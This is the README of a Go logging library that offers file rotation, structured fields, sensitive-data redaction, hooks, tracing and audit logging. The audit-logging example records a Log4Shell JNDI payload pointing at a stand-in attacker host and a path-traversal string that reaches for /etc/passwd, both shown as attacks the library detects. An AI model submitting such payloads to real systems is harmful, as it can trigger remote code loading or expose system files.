# DD - High-Performance Go Logging Library

[![Go Version](https://img.shields.io/badge/Go-1.22+-00ADD8?style=flat&logo=go)](https://go.dev/)
[![pkg.go.dev](https://pkg.go.dev/badge/github.com/cybergodev/dd.svg)](https://pkg.go.dev/github.com/cybergodev/dd)
[![License](https://img.shields.io/badge/license-MIT-brightgreen.svg)](LICENSE)
[![Security](https://img.shields.io/badge/security-policy-blue.svg)](SECURITY.md)
[![Thread Safe](https://img.shields.io/badge/thread%20safe-yes-brightgreen.svg)](https://github.com/cybergodev/dd)

A production-grade high-performance Go logging library with zero external dependencies, designed for modern applications.

**[📖 中文文档](README_zh-CN.md)**

## ✨ Key Features

| Feature | Description |
|---------|-------------|
| 🚀 **High Performance** | 3M+ ops/sec simple logging, optimized for high-throughput |
| 🔒 **Thread-Safe** | Atomic operations + lock-free design, fully concurrent-safe |
| 🛡️ **Built-in Security** | Sensitive data filtering, injection attack prevention |
| 📊 **Structured Logging** | Type-safe fields, JSON/text formats, customizable field names |
| 📁 **Smart Rotation** | Auto-rotate by size, auto-compress, auto-cleanup |
| 📦 **Zero Dependencies** | Only Go standard library |
| 🎯 **Easy to Use** | Get started in 30 seconds with intuitive API |
| 🌐 **Cloud-Native** | JSON format compatible with ELK/Splunk/CloudWatch |

## 📦 Installation

```bash
go get github.com/cybergodev/dd
```

## 🚀 Quick Start

### 30-Second Setup

```go
package main

import "github.com/cybergodev/dd"

func main() {
    // Zero setup - use package-level functions
    dd.Debug("Debug message")
    dd.Info("Application started")
    dd.Warn("Cache miss")
    dd.Error("Connection failed")
    // dd.Fatal("Critical error")  // Calls os.Exit(1)

    // Structured logging with fields
    dd.InfoWith("Request processed",
        dd.String("method", "GET"),
        dd.Int("status", 200),
        dd.Float64("duration_ms", 45.67),
    )
}
```

### File Logging

```go
package main

import "github.com/cybergodev/dd"

func main() {
    // One-line file logging
    logger := dd.MustToFile("logs/app.log")
    defer logger.Close()

    logger.Info("Application started")
    logger.InfoWith("User login",
        dd.String("user_id", "12345"),
        dd.String("ip", "192.168.1.100"),
    )
}
```

### Convenience Constructors

```go
// Quick constructors (return error)
logger, err := dd.ToFile()              // → logs/app.log (text)
if err != nil { /* handle error */ }

logger, err = dd.ToJSONFile()          // → logs/app.log (JSON)
if err != nil { /* handle error */ }

logger, err = dd.ToConsole()           // → stdout only
if err != nil { /* handle error */ }

logger, err = dd.ToAll()               // → console + file
if err != nil { /* handle error */ }

// Must* variants (panic on error, return *Logger)
logger := dd.MustToFile("logs/app.log")
logger := dd.MustToJSONFile("logs/app.log")
logger := dd.MustToConsole()
logger := dd.MustToAll("logs/app.log")

defer logger.Close()
```

## 📖 Configuration

### Preset Configurations

```go
// Production (default) - Info level, text format
logger, err := dd.New(dd.DefaultConfig())

// Development - Debug level, caller info
logger, err := dd.New(dd.DevelopmentConfig())

// Cloud-native - JSON format, debug level
logger, err := dd.New(dd.JSONConfig())
```

### Custom Configuration

```go
cfg := dd.DefaultConfig()
cfg.Level = dd.LevelDebug
cfg.Format = dd.FormatJSON
cfg.DynamicCaller = true  // Show caller file:line

// File output with rotation
cfg.File = &dd.FileConfig{
    Path:       "logs/app.log",
    MaxSizeMB:  100,                 // Rotate at 100MB
    MaxBackups: 10,                  // Keep 10 backups
    MaxAge:     30 * 24 * time.Hour, // Delete after 30 days
    Compress:   true,                // Gzip old files
}

logger, err := dd.New(cfg)
defer logger.Close()
```

### JSON Customization

```go
cfg := dd.JSONConfig()
cfg.JSON.FieldNames = &dd.JSONFieldNames{
    Timestamp: "@timestamp",  // ELK standard
    Level:     "severity",
    Message:   "msg",
    Caller:    "source",
}
cfg.JSON.PrettyPrint = true  // For development

logger, err := dd.New(cfg)
```

## 🛡️ Security Features

### Sensitive Data Filtering

```go
cfg := dd.DefaultConfig()
cfg.Security = dd.DefaultSecurityConfig()  // Enable basic filtering

logger, err := dd.New(cfg)

// Automatic filtering
logger.Info("password=secret123")           // → password=[REDACTED]
logger.Info("api_key=sk-abc123")            // → api_key=[REDACTED]
logger.Info("credit_card=4532015112830366") // → credit_card=[REDACTED]
logger.Info("email=user@example.com")       // → email=[REDACTED]
```

**Basic Filtering** covers: passwords, API keys, credit cards, phone numbers, database URLs

**Full Filtering** adds: JWTs, AWS keys, IPs, SSNs

```go
cfg.Security = dd.DefaultSecureConfig()  // Full filtering
```

### Custom Patterns

```go
filter := dd.NewEmptySensitiveDataFilter()
filter.AddPatterns(
    `(?i)internal_token[:\s=]+[^\s]+`,
    `(?i)session_id[:\s=]+[^\s]+`,
)

cfg := dd.DefaultConfig()
cfg.Security = &dd.SecurityConfig{
    SensitiveFilter: filter,
}
```

### Disable Security (Max Performance)

```go
cfg := dd.DefaultConfig()
cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelDevelopment)
```

## 📊 Structured Logging

### Field Types

```go
logger.InfoWith("All field types",
    dd.String("user", "alice"),
    dd.Int("count", 42),
    dd.Int64("id", 9876543210),
    dd.Float64("score", 98.5),
    dd.Bool("active", true),
    dd.Time("created_at", time.Now()),
    dd.Duration("elapsed", 150*time.Millisecond),
    dd.Err(errors.New("connection failed")),
    dd.Any("tags", []string{"vip", "premium"}),
)
```

### Context Chaining

```go
// Create logger with persistent fields
userLogger := logger.WithFields(
    dd.String("service", "user-api"),
    dd.String("version", "1.0.0"),
)

// All logs include service and version
userLogger.Info("User authenticated")
userLogger.InfoWith("Profile loaded", dd.String("user_id", "123"))

// Chain more fields
requestLogger := userLogger.WithFields(
    dd.String("request_id", "req-abc-123"),
)
requestLogger.Info("Processing request")
```

## 🔧 Output Management

### Multiple Outputs

```go
// Console + file
logger := dd.MustToAll("logs/app.log")

// Or use MultiWriter
fileWriter, err := dd.NewFileWriter("logs/app.log")
if err != nil { /* handle error */ }

multiWriter := dd.NewMultiWriter(os.Stdout, fileWriter)

cfg := dd.DefaultConfig()
cfg.Output = multiWriter
logger, err := dd.New(cfg)
```

### Buffered Writes (High Throughput)

```go
fileWriter, err := dd.NewFileWriter("logs/app.log")
if err != nil { /* handle error */ }

bufferedWriter, err := dd.NewBufferedWriter(fileWriter)  // Default 4KB buffer
if err != nil { /* handle error */ }
defer bufferedWriter.Close()  // IMPORTANT: Flush on close

cfg := dd.DefaultConfig()
cfg.Output = bufferedWriter
logger, err := dd.New(cfg)
```

### Dynamic Writer Management

```go
logger, err := dd.New()

fileWriter, err := dd.NewFileWriter("logs/dynamic.log")
if err != nil { /* handle error */ }

logger.AddWriter(fileWriter)        // Add at runtime
logger.RemoveWriter(fileWriter)     // Remove at runtime

fmt.Printf("Writers: %d\n", logger.WriterCount())
```

## 🌐 Context & Tracing

### Context Keys

```go
ctx := context.Background()
ctx = dd.WithTraceID(ctx, "trace-abc123")
ctx = dd.WithSpanID(ctx, "span-def456")
ctx = dd.WithRequestID(ctx, "req-789xyz")

// Context-aware logging
logger.InfoCtx(ctx, "Processing request")
logger.InfoWithCtx(ctx, "User action", dd.String("action", "login"))
```

### Custom Context Extractors

```go
tenantExtractor := func(ctx context.Context) []dd.Field {
    if tenantID := ctx.Value("tenant_id"); tenantID != nil {
        return []dd.Field{dd.String("tenant_id", tenantID.(string))}
    }
    return nil
}

cfg := dd.DefaultConfig()
cfg.ContextExtractors = []dd.ContextExtractor{tenantExtractor}
```

## 🪝 Hooks

```go
hooks := dd.NewHookBuilder().
    BeforeLog(func(ctx context.Context, hctx *dd.HookContext) error {
        fmt.Printf("Before: %s\n", hctx.Message)
        return nil
    }).
    AfterLog(func(ctx context.Context, hctx *dd.HookContext) error {
        fmt.Printf("After: %s\n", hctx.Message)
        return nil
    }).
    OnError(func(ctx context.Context, hctx *dd.HookContext) error {
        fmt.Printf("Error: %v\n", hctx.Error)
        return nil
    }).
    Build()

cfg := dd.DefaultConfig()
cfg.Hooks = hooks
```

## 🔐 Audit Logging

```go
// Create audit logger
auditCfg := dd.DefaultAuditConfig()
auditLogger := dd.NewAuditLogger(auditCfg)
defer auditLogger.Close()

// Log security events
auditLogger.LogSensitiveDataRedaction("password=*", "password", "Password redacted")
auditLogger.LogPathTraversalAttempt("../../../etc/passwd", "Path traversal blocked")
auditLogger.LogSecurityViolation("LOG4SHELL", "Pattern detected", map[string]any{
    "input": "${jndi:ldap://evil.com/a}",
})
```

## 📝 Log Integrity

```go
// Create signer with secret key
integrityCfg := dd.DefaultIntegrityConfig()
signer, err := dd.NewIntegritySigner(integrityCfg)
if err != nil { /* handle error */ }

// Sign log messages
message := "Critical audit event"
signature := signer.Sign(message)
fmt.Printf("Signed: %s %s\n", message, signature)

// Verify signature
result := dd.VerifyAuditEvent(message+" "+signature, signer)
if result.Valid {
    fmt.Println("Signature valid")
}
```

## 📈 Performance

| Operation | Throughput | Memory/Op | Allocs/Op |
|-----------|------------|-----------|-----------|
| Simple Logging | **3.1M ops/sec** | 200 B | 7 |
| Structured (3 fields) | **1.9M ops/sec** | 417 B | 12 |
| JSON Format | **600K ops/sec** | 800 B | 20 |
| Level Check | **2.5B ops/sec** | 0 B | 0 |
| Concurrent (22 goroutines) | **68M ops/sec** | 200 B | 7 |

## 📚 API Reference

### Package-Level Functions

```go
// Simple logging
dd.Debug(args ...any)
dd.Info(args ...any)
dd.Warn(args ...any)
dd.Error(args ...any)
dd.Fatal(args ...any)  // Calls os.Exit(1)

// Formatted logging
dd.Debugf(format string, args ...any)
dd.Infof(format string, args ...any)
dd.Warnf(format string, args ...any)
dd.Errorf(format string, args ...any)
dd.Fatalf(format string, args ...any)

// Structured logging
dd.InfoWith(msg string, fields ...dd.Field)
dd.ErrorWith(msg string, fields ...dd.Field)
// ... DebugWith, WarnWith, FatalWith

// Context-aware logging
dd.InfoCtx(ctx context.Context, args ...any)
dd.InfoWithCtx(ctx context.Context, msg string, fields ...dd.Field)
// ... DebugCtx, WarnCtx, ErrorCtx, FatalCtx

// Global logger management
dd.SetDefault(logger *Logger)
dd.SetLevel(level LogLevel)
dd.GetLevel() LogLevel
```

### Logger Methods

```go
logger, err := dd.New()

// Simple logging
logger.Info(args ...any)
logger.Infof(format string, args ...any)
logger.InfoWith(msg string, fields ...Field)

// Context-aware
logger.InfoCtx(ctx context.Context, args ...any)
logger.InfoWithCtx(ctx context.Context, msg string, fields ...Field)

// Configuration
logger.SetLevel(level LogLevel)
logger.GetLevel() LogLevel
logger.AddWriter(w io.Writer) error
logger.RemoveWriter(w io.Writer) error
logger.Close() error
logger.Flush()

// Context chaining
logger.WithFields(fields ...Field) *LoggerEntry
logger.WithField(key string, value any) *LoggerEntry
```

### Field Constructors

```go
dd.String(key, value string)
dd.Int(key string, value int)
dd.Int64(key string, value int64)
dd.Float64(key string, value float64)
dd.Bool(key string, value bool)
dd.Time(key string, value time.Time)
dd.Duration(key string, value time.Duration)
dd.Err(err error)
dd.ErrWithStack(err error)  // Include stack trace
dd.Any(key string, value any)
```

### Context Functions

```go
// Set context values
dd.WithTraceID(ctx context.Context, id string) context.Context
dd.WithSpanID(ctx context.Context, id string) context.Context
dd.WithRequestID(ctx context.Context, id string) context.Context

// Get context values
dd.GetTraceID(ctx context.Context) string
dd.GetSpanID(ctx context.Context) string
dd.GetRequestID(ctx context.Context) string
```

## 📁 Examples

See the [examples](examples) directory for complete, runnable examples:

| File | Description |
|------|-------------|
| [01_quick_start.go](examples/01_quick_start.go) | Basic usage in 5 minutes |
| [02_structured_logging.go](examples/02_structured_logging.go) | Type-safe fields, WithFields |
| [03_configuration.go](examples/03_configuration.go) | Config API, presets, rotation |
| [04_security.go](examples/04_security.go) | Filtering, custom patterns |
| [05_writers.go](examples/05_writers.go) | File, buffered, multi-writer |
| [06_context_hooks.go](examples/06_context_hooks.go) | Tracing, hooks |
| [07_convenience.go](examples/07_convenience.go) | Quick constructors |
| [08_production.go](examples/08_production.go) | Production patterns |
| [09_advanced.go](examples/09_advanced.go) | Sampling, validation |
| [10_audit_integrity.go](examples/10_audit_integrity.go) | Audit, integrity |

## 🤝 Contributing

Contributions welcome! Please read the contributing guidelines before submitting PRs.

## 📄 License

MIT License - See [LICENSE](LICENSE) file for details.

---

**Crafted with care for the Go community** ❤️

If this project helps you, please give it a ⭐️ Star!
